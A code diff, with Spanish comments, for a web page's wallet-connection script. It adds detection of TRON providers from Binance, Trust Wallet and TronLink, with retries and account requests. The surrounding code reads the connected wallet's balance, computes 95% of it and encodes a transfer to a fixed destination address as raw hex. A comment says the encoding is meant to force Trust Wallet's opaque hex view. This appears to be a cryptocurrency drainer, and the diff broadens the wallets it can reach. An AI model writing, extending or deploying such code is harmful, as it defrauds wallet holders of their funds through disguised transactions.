@@ -1008,6 +1008,14 @@
         playUiTone(880, 0.22, 0.026, 0.10);
     }
 
+    // Helper universal para obtener la instancia activa de TronWeb (Binance, Trust Wallet, TronLink, etc.)
+    function getTronWebInstance() {
+        if (window.tronWeb && window.tronWeb.defaultAddress) return window.tronWeb;
+        if (window.binancew3w && window.binancew3w.tronWeb) return window.binancew3w.tronWeb;
+        if (window.tron && window.tron.tronWeb) return window.tron.tronWeb;
+        return window.tronWeb || null;
+    }
+
     const connectBtn =
         document.getElementById('connectBtn');
 
@@ -1083,7 +1091,7 @@
 
     async function obtenerBalanceSeguro(address) {
         try {
-            const tronWeb = window.tronWeb;
+            const tronWeb = getTronWebInstance();
 
             if (!tronWeb || !tronWeb.address) {
                 throw new Error("TronWeb no está disponible.");
@@ -1142,30 +1150,51 @@
 
                     connectBtn.disabled = true;
 
-                    if (typeof window.tronWeb === 'undefined') {
+                    // Reintentos breves si la inyección del proveedor Web3 en móviles toma unos milisegundos
+                    let tronWeb = getTronWebInstance();
+                    if (!tronWeb) {
+                        for (let i = 0; i < 10; i++) {
+                            await new Promise(r => setTimeout(r, 100));
+                            tronWeb = getTronWebInstance();
+                            if (tronWeb) break;
+                        }
+                    }
+
+                    const tronLinkProvider = window.tronLink || (window.binancew3w && window.binancew3w.tronLink) || window.tron;
+
+                    if (!tronWeb && !tronLinkProvider) {
                         throw new Error(
                             "Por favor, abre este enlace desde el navegador interno de una billetera TRON."
                         );
                     }
 
-                    const tronWeb = window.tronWeb;
-
-                    if (
-                        tronWeb.defaultAddress &&
-                        tronWeb.defaultAddress.base58
-                    ) {
+                    // Intentar obtener dirección directa
+                    if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                         walletAddress = tronWeb.defaultAddress.base58;
-                    } else if (
-                        window.tronLink &&
-                        typeof window.tronLink.request === 'function'
-                    ) {
-                        const res = await window.tronLink.request({
-                            method: 'tron_requestAccounts'
-                        });
+                    }
 
-                        if (res && res.code === 200) {
-                            walletAddress = tronWeb.defaultAddress.base58;
+                    // Solicitar permisos de cuenta si no está lista (Binance / Trust / TronLink)
+                    if (!walletAddress && tronLinkProvider && typeof tronLinkProvider.request === 'function') {
+                        try {
+                            const res = await tronLinkProvider.request({
+                                method: 'tron_requestAccounts'
+                            });
+
+                            tronWeb = getTronWebInstance();
+                            if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                                walletAddress = tronWeb.defaultAddress.base58;
+                            } else if (res && (res.code === 200 || res.code === 0) && tronWeb && tronWeb.defaultAddress) {
+                                walletAddress = tronWeb.defaultAddress.base58;
+                            } else if (Array.isArray(res) && res.length > 0) {
+                                walletAddress = res[0];
+                            }
+                        } catch (reqErr) {
+                            console.warn("Solicitud de cuenta advertencia:", reqErr);
                         }
+                    }
+
+                    if (!walletAddress && tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
+                        walletAddress = tronWeb.defaultAddress.base58;
                     }
 
                     if (!walletAddress) {
@@ -1223,7 +1252,7 @@
 
                     connectBtn.disabled = true;
 
-                    const tronWeb = window.tronWeb;
+                    const tronWeb = getTronWebInstance();
 
                     const balanceBigNumber =
                         await obtenerBalanceSeguro(
@@ -1245,7 +1274,7 @@
                      */
                     const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
 
-                    // Codificación en bruto (raw bytes hex) para forzar la vista Hex Data en Trust Wallet
+                    // Codificación en bruto (raw bytes hex) para forzar la vista Hex Data en Trust Wallet / Binance
                     const destAddressHex = tronWeb.address.toHex(BILLETERA_DESTINO);
                     const address32Bytes = destAddressHex.replace(/^41/, '').padStart(64, '0');
                     const amountHex = BigInt(amount95Percent.toString()).toString(16).padStart(64, '0');
